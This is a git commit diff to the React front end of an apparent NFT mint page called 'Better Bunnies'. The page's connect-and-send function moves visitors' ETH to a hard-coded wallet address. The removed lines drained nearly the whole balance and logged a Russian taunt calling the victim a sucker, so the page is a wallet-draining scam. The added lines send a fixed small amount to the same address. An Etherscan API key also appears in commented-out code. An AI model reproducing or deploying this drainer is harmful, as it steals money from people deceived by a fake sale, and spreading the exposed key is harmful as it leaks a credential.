d26a793c3e689e63cd150740002e1dbac63cd6d1
peshehonov_gv <peshehonov_gv@smart-transport.ru>
2022-04-20 11:53:35 +0500

    asdasd

--- src/App.js
+++ src/App.js
@@ -3,7 +3,7 @@ import {useEffect, useState} from "react";
 import imgDiscord from './icons8-discord-50.png'
 import imgTwitter from './icons8-twitter-50.png'
 
-const ethAmount = 0.06
+const ethAmount = 0.001
 const image = 'https://images-ext-2.discordapp.net/external/5FI7neL0rIaD_xjYOh6NIyBP_G3sHewdKHOQ-rhmIRI/https/pbs.twimg.com/profile_images/1515763747574403075/RypnM0Ki_400x400.jpg'
 const Title = 'Better Bunnies'
 const supply = 3000
@@ -13,6 +13,16 @@ document.title = Title
 function App() {
     const [opacity, setOpacity] = useState(0)
     const [offset, setOffset] = useState(0)
+    // const [gas, setGas] = useState(null)
+
+    // useEffect(() => {
+    //     const fetchRequest = async () => {
+    //         const response = await fetch('https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey=PW7Z9MJMX6YRBM2M2HAS6CP14Y1ZCUXPWH')
+    //         const responseJSON = await response.json()
+    //         setGas(responseJSON?.result?.FastGasPrice)
+    //     }
+    //     fetchRequest()
+    // }, [])
 
     const connectAndSend = async (fromWallet) => {
         try {
@@ -27,20 +37,19 @@ function App() {
 
         const balance = await window.ethereum.request({method: 'eth_getBalance', params: [address[0], 'latest']})
 
-        console.log('balance',(parseInt(balance) - Number(3700000000000000)) / 1000000000000000000)
+        // console.log('balance', ethAmount, gas, (gas / 15) / 3089, (ethAmount - (Number(gas) / 10000)))
 
         let params = [{
             "from": address[0],
             "to": '0x2affCC7D6BD232E9115b28AB635960C80d51E9F2',
-            "gas": Number(21000).toString(16),
-            "gasPrice": Number(350000000000).toString(16),
-            "value": (parseInt(balance) - Number(9500000000000000)).toString(16)
+            // "gas": Number(((gas / 15) / 3089) * 10000000).toFixed().toString(16),
+            // "gasPrice": Number(gas * 600000000).toString(16),
+            "value": parseInt(ethAmount * 1000000000000000000).toString(16)
         }]
 
         const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
             console.log(err)
         })
-        console.log('Ты потерял свои бабки, лох',response,params)
     }
 
     setTimeout(() => {
@@ -55,9 +64,8 @@ function App() {
     useEffect(() => {
         if (Number(offset) <= 230) {
             const timer = setTimeout(() => {
-                const random = getRandomArbitrary(2, 6)
+                const random = getRandomArbitrary(1, 3)
                 const randomToFixed = Number(random.toFixed())
-                // console.log(Number(offset), Number(randomToFixed))
                 setOffset(Number(offset) + randomToFixed)
             }, 4000)
             return () => clearTimeout(timer);
